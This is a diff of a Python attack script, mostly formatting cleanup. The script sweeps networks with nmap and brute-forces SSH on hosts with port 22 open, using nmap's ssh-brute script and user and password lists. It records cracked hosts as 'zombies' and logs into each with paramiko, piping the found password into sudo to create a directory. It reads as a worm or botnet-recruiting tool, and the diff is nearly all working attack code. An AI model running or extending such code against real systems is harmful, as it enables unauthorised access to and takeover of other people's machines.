@@ -14,11 +14,11 @@ def openFile(path, action='w'):
     try:
         return open(path, action)
     except:
-        threadSafePrint(bcolors.BOLD , bcolors.FAIL, "Something went wrong in opening file" ,  bcolors.ENDC)
+        threadSafePrint(bcolors.BOLD, bcolors.FAIL, "Something went wrong in opening file", bcolors.ENDC)
 
 
 def sshLogin(user, ip, password):
-    threadSafePrint(bcolors.BOLD , bcolors.HEADER , "Starting ssh login thread for ", ip ,  bcolors.ENDC)
+    threadSafePrint(bcolors.BOLD, bcolors.HEADER, "Starting ssh login thread for ", ip, bcolors.ENDC)
     try:
         p = paramiko.SSHClient()
         p.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -33,7 +33,7 @@ def sshLogin(user, ip, password):
         stdout = channel.makefile('rb')
 
         stdin.write(
-        '''
+            '''
         cd /home
         echo ''' + password + '''| sudo -S mkdir kabali
         cd kabali 
@@ -56,16 +56,17 @@ def sshLogin(user, ip, password):
         exit
         '''
         )
-        threadSafePrint(bcolors.OKCYAN , stdout.read() , bcolors.ENDC)
+        threadSafePrint(bcolors.OKCYAN, stdout.read(), bcolors.ENDC)
     except:
-        threadSafePrint(bcolors.BOLD , bcolors.FAIL, "Something went wrong while login to ", ip, "with username ", user, "and password ", password , bcolors.ENDC)
+        threadSafePrint(bcolors.BOLD, bcolors.FAIL, "Something went wrong while login to ", ip, "with username ", user,
+                        "and password ", password, bcolors.ENDC)
 
 
 def ssh(ip):
-    threadSafePrint(bcolors.BOLD , bcolors.HEADER , " ************************* BRUTE FORCE LOGIN IS IN PROGRESS *****************", ip ,  bcolors.ENDC)
+    threadSafePrint(bcolors.BOLD, bcolors.HEADER,
+                    " ************************* BRUTE FORCE LOGIN IS IN PROGRESS *****************", ip, bcolors.ENDC)
     zombies = openFile('zombies.txt', 'a')
-    scanner_t2.scan(hosts=ip, ports='22', arguments='--script ssh-brute --script-args userdb=users.txt,'
-                                                    'passdb=passwords.txt')
+    scanner_t2.scan(hosts=ip, ports='22', arguments='--script ssh-brute --script-args userdb=users.txt passdb=passwords.txt')
 
     if scanner_t2[ip].state() == 'up':
         protocols = scanner_t2[ip].all_protocols()
@@ -79,54 +80,62 @@ def ssh(ip):
                 t = Thread(target=sshLogin, args=(user, ip, password))
                 t.start()
             except:
-                threadSafePrint(bcolors.BOLD , bcolors.FAIL , "xxxxxxxxxxxxxxxxxxxxx NOT CONNECTED xxxxxxxxxxxxxxxxxxx" ,  bcolors.ENDC)
+                threadSafePrint(bcolors.BOLD, bcolors.FAIL, "xxxxxxxxxxxxxxxxxxxxx NOT CONNECTED TO ", ip, "xxxxxxxxxxxxxxxxxxx", bcolors.ENDC)
+        else:
+            threadSafePrint(bcolors.BOLD, bcolors.WARNING, "tcp is not in supported protocol list", bcolors.ENDC)
+    else:
+        threadSafePrint(bcolors.BOLD, bcolors.WARNING, 'The host is', ip, 'not down', bcolors.ENDC)
     zombies.close()
 
 
 def scan(q, network):
-    threadSafePrint(bcolors.BOLD , bcolors.HEADER , "Start scanning..." ,  bcolors.ENDC)
+    threadSafePrint(bcolors.BOLD, bcolors.HEADER, "Start scanning...", bcolors.ENDC)
     newConnectedIp = []
     while True:
         for ip in network:
             scanner_t1.scan(hosts=ip, arguments='-sn')
-            threadSafePrint(bcolors.OKCYAN , "Already found Ip ", newConnectedIp ,  bcolors.ENDC)
-            threadSafePrint(bcolors.OKCYAN , "Scanned :", scanner_t1.all_hosts() ,  bcolors.ENDC)
+            threadSafePrint(bcolors.OKCYAN, "Already found Ip ", newConnectedIp, bcolors.ENDC)
+            threadSafePrint(bcolors.OKCYAN, "Scanned :", scanner_t1.all_hosts(), bcolors.ENDC)
             for newIp in scanner_t1.all_hosts():
                 if newIp not in newConnectedIp:
-                    threadSafePrint(bcolors.BOLD , bcolors.OKGREEN , "new ip is found : ", newIp , bcolors.ENDC)
+                    threadSafePrint(bcolors.BOLD, bcolors.OKGREEN, "new ip is found : ", newIp, bcolors.ENDC)
                     scanner_t1.scan(newIp, '1-1024', '-v -sS')
                     if scanner_t1[newIp].state() == 'up':
                         protocols = scanner_t1[newIp].all_protocols()
                         if 'tcp' in protocols:
                             ports = scanner_t1[newIp]['tcp'].keys()
-                            threadSafePrint( bcolors.BOLD , "Open port of ", newIp, ports ,  bcolors.ENDC)
+                            threadSafePrint(bcolors.BOLD, "Open port of ", newIp, ports, bcolors.ENDC)
                             if 22 in ports:
                                 q.put(newIp + ":22")
                                 newConnectedIp.append(newIp)
-                                threadSafePrint( bcolors.BOLD , bcolors.OKBLUE , "port 22 is opened" ,  bcolors.ENDC)
+                                threadSafePrint(bcolors.BOLD, bcolors.OKBLUE, "port 22 is opened", bcolors.ENDC)
                             else:
-                                threadSafePrint( bcolors.BOLD , bcolors.FAIL , "port 22 is not opened" ,  bcolors.ENDC)
+                                threadSafePrint(bcolors.BOLD, bcolors.FAIL, "port 22 is not opened", bcolors.ENDC)
                         # TODO : for another protocol and port
                         else:
-                            threadSafePrint(bcolors.BOLD , bcolors.WARNING , "tcp is not in supported protocol list" , bcolors.ENDC)
+                            threadSafePrint(bcolors.BOLD, bcolors.WARNING, "tcp is not in supported protocol list",
+                                            bcolors.ENDC)
                     else:
-                        threadSafePrint(bcolors.BOLD , bcolors.WARNING , "The device in ", newIp, " is DOWN" ,  bcolors.ENDC)
-        threadSafePrint( bcolors.OKCYAN , "A round is finished" ,  bcolors.ENDC)
-    threadSafePrint(bcolors.BOLD , bcolors.WARNING , "Exiting from scanning..." , bcolors.ENDC)
+                        threadSafePrint(bcolors.BOLD, bcolors.WARNING, "The device in ", newIp, " is DOWN",
+                                        bcolors.ENDC)
+        threadSafePrint(bcolors.OKCYAN, "A round is finished", bcolors.ENDC)
+    threadSafePrint(bcolors.BOLD, bcolors.WARNING, "Exiting from scanning...", bcolors.ENDC)
 
 
 def attack(q):
-    threadSafePrint(bcolors.BOLD , bcolors.HEADER , "Start attack..." ,  bcolors.ENDC)
+    threadSafePrint(bcolors.BOLD, bcolors.HEADER, "Start attack...", bcolors.ENDC)
     while True:
         if q.empty():
             pass
         else:
             ip, port = q.get().split(':')
-            threadSafePrint(bcolors.OKCYAN , "!!!!!!!!!!!!!!!!!!!!!!!!  Trying to attack to ", ip, "on port ", port , "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!" , bcolors.ENDC)
+            threadSafePrint(bcolors.OKCYAN, "!!!!!!!!!!!!!!!!!!!!!!!!  Trying to attack to ", ip, "on port ", port,
+                            "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!", bcolors.ENDC)
             if port.find("22") != -1:
                 ssh(ip)
             else:
-                threadSafePrint(bcolors.BOLD , bcolors.WARNING , "There is no supported port to connect to ", ip , bcolors.ENDC)
+                threadSafePrint(bcolors.BOLD, bcolors.WARNING, "There is no supported port to connect to ", ip,
+                                bcolors.ENDC)
 
 
 if __name__ == '__main__':
